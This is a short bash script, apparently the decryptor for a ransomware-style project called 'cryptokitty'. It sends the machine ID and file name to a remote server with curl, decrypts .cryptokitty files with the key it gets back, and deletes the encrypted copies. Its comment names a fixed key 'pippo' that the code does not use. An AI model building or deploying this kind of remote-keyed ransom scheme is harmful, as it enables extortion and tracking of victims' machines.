#!/bin/bash
if [[ $1 =~ \.cryptokitty$ ]]; 
  then
  f=$1
  f=${f%.cryptokitty}
  echo $f 
  #i decrypt the files with extension .cryptokitty and i use the key "pippo", then i remove the crypted files leaving only the clear text ones
  [ -f $1 ] && touch "$f" && key=$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$f\&a=g) && echo $key && openssl enc -d -aes-256-cbc -in $1 -k "$key" -out "$f" && truncate -s $(head -n-42 $f | wc -c) $f && rm "$f.cryptokitty"
fi
